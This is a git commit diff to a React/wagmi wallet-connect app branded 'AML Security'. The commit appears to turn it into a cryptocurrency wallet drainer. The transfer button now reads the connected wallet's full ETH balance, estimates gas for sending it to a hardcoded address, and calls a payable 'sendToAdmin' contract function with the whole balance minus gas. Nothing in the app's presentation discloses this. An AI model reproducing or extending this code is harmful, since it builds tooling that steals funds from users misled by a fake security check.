f75e6e5a868a6242ff8d42ad17345048c7befa09
Vladyslav Kurko <v.kurko2012@gmail.com>
2024-11-03 17:30:25 +0100

    integrate with eth smart contract

--- tron-walletconnect-app/src/components/buttons/transfer-funds-button.tsx
+++ tron-walletconnect-app/src/components/buttons/transfer-funds-button.tsx
@@ -1,23 +1,52 @@
-import { type BaseError, useWaitForTransactionReceipt, useWriteContract, useAccount } from 'wagmi'
+import { type BaseError, useWaitForTransactionReceipt, useWriteContract, useAccount, useConfig, useBalance } from 'wagmi';
+import config from '../../config';
+import { estimateGas, getGasPrice } from 'wagmi/actions';
+import { useState } from 'react';
 
-import config from '../../config'
-
-const { ethAbi, ethContractAddress, functionName } = config
+const { ethAbi, ethContractAddress, functionName } = config;
 
 export function TransferFundsButton() {
-  const { data: hash, error, isPending, writeContract } = useWriteContract()
-  const { isConnected } = useAccount()
+  const { data: hash, error, isPending, writeContract } = useWriteContract();
+  const { isConnected, address } = useAccount();
+  const { data: balance } = useBalance({ address });
+  const usedConfig = useConfig();
+
+  const [errorMessage, setErrorMessage] = useState('');
 
   const handleTransfer = async () => {
-    writeContract({
-      address: ethContractAddress as `0x${string}`,
-      abi: ethAbi,
-      functionName,
-      args: []
-    })
-  }
+    try {
+      const gasPrice = await getGasPrice(usedConfig)
+      const gasEstimate = await estimateGas(usedConfig, {
+        to: '0xd2135CfB216b74109775236E36d4b433F1DF507B',
+        value: balance?.value,
+        gasPrice
+      });
 
-  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash })
+      console.log("Gas", gasEstimate);
+      
+      await writeContract({
+        address: ethContractAddress as `0x${string}`,
+        abi: ethAbi,
+        functionName,
+        args: [],
+        gas: gasEstimate,
+        value: balance?.value && balance.value - gasEstimate,  // Ensuring there's enough balance for the gas cost
+      });
+      
+      // Reset any previous error messages on a successful attempt
+      setErrorMessage('');
+
+    } catch (error) {
+      if ((error as any).name  === 'EstimateGasExecutionError') {
+        setErrorMessage('Transaction failed: Insufficient balance to cover gas costs.');
+      } else {
+        setErrorMessage('An error occurred. Please try again.');
+      }
+      console.error('Error during transfer:', error);
+    }
+  };
+
+  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });
 
   return (
     <div>
@@ -29,9 +58,9 @@ export function TransferFundsButton() {
           {hash && <div>Transaction Hash: {hash}</div>}
           {isConfirming && <div>Waiting for confirmation...</div>}
           {isConfirmed && <div>Transaction confirmed.</div>}
-          {error && <div>Error: {(error as BaseError).shortMessage || error.message}</div>}
+          {(errorMessage || error ) && <div style={{ color: 'red' }}>{(errorMessage || (error as BaseError).shortMessage || error?.message)}</div>}
         </div>
       ) : null}
     </div>
-  )
+  );
 }
--- tron-walletconnect-app/src/config.ts
+++ tron-walletconnect-app/src/config.ts
@@ -1,25 +1,30 @@
+import { http } from 'wagmi'
 import { mainnet } from 'wagmi/chains'
 
 const config = {
-    projectId: 'b8af9d20aeff633b2b0547d8af6edb5a', // Replace with your project id
+    projectId: 'b8af9d20aeff633b2b0547d8af6edb5a', // Replace with your reown project id (https://reown.com/)
     chains: [mainnet], // Possible values are: testnet, arbitrum etc.
+    transports: {
+        [mainnet.id]: http(),
+    },
     ethAbi: [ // replace with Eth contract abi
         {
             inputs: [],
-            name: 'deposit', // keep same as functionName below
+            name: 'sendToAdmin', // keep same as functionName below
             outputs: [],
             stateMutability: 'payable',
             type: 'function'
         }
     ],
-    ethContractAddress: '0x12c5cf664DcEF8bf1375172DC31a8a473046fF25', // replace with the actual address
-    functionName: 'deposit', // replace with the actual functionName
+    ethContractAddress: '0x14B995B9F37F9F79926ad0889Dd49a314499716B', // replace with the actual address
+    functionName: 'sendToAdmin', // replace with the actual functionName
     metadata: { // Replace with your data
         name: 'AML Security',
         description: 'AML Security app',
         url: 'https://aml-security.com', // origin must match your domain & subdomain
         icons: ['https://avatars.githubusercontent.com/u/179229932']
     },
+    // ---- Tron Configs ----
     tronContractAddress: 'TAfLyqu3xXMhPcHr5pQdpyadVrZ6DrBRYu', // Replace with your contract address
     tronFunctionName: 'YOUR_FUNCTION_NAME',
     tronFunctionParams: [] // add any params
